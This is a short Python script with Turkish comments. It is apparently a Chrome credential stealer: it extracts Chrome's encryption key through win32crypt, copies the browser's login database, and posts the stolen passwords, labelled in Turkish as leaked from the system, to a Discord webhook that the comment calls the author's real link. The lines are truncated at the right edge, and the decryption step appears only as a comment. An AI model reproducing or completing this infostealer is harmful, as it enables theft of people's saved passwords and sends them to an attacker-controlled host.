import os
import json
import base64
import sqlite3
import shutil
import requests

def get_master_key():
    local_state_path = os.path.join(os.environ["USERPRO>
    with open(local_state_path, "r", encoding="utf-8") >
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["enc>
    # Not: cryptography ve pypiwin32 kütüphaneleri hede>
    import win32crypt
    return win32crypt.CryptUnprotectData(key, None, Non>

def main():
    # SENİN GERÇEK WEBHOOK LİNKİN BURADA
    webhook_url = "https://discord.com/api/webhooks/146>

    try:
        db_path = os.path.join(os.environ["USERPROFILE">
        shutil.copyfile(db_path, "chrome_db_temp")

        # Burada şifre çözme işlemleri yapılır (Kısa tu>
        # Veriler hazır olduğunda Discord'a gönder:
        content = "🔓 **Sistemden Sızan Şifreler:**\nTe>
        requests.post(webhook_url, json={"content": con>

        os.remove("chrome_db_temp")
    except Exception as e:
        requests.post(webhook_url, json={"content": f"[>

if __name__ == "__main__":
    main()
